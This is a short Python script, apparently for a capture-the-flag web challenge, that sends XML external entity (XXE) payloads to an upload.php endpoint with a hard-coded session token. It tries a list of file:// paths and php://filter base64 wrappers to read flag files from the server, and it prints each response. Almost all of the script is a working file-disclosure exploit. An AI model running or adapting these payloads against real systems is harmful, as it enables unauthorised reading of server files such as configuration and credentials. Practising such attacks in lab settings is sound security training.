import requests

url = 'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/upload.php'
cookies = {'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MDY3MTJ9.CqErZOY8Ac-MBNgnLOXKu8G1WJlUzOIcrIkpu9ji6gA'}

# 尝试各种 flag 位置
flag_paths = [
    'file:///flag',
    'file:///flag.txt',
    'file:///root/flag',
    'file:///root/flag.txt',
    'file:///home/flag',
    'file:///var/www/html/flag',
    'file:///var/www/html/flag.txt',
    'file:///tmp/flag',
    'php://filter/read=convert.base64-encode/resource=flag',
    'php://filter/read=convert.base64-encode/resource=/flag',
]

for path in flag_paths:
    print(f"\n=== Testing: {path} ===")

    payload = f"""<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{path}"> ]>
    <data>&xxe;</data>"""

    headers = {'Content-Type': 'application/xml'}
    try:
        resp = requests.post(url, data=payload, headers=headers, cookies=cookies, timeout=5)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text}")

        # 检查响应中是否有异常内容
        if 'flag' in resp.text.lower() and '上传成功' not in resp.text:
            print("🎉可能找到了！")
            break

    except Exception as e:
        print(f"Error: {e}")
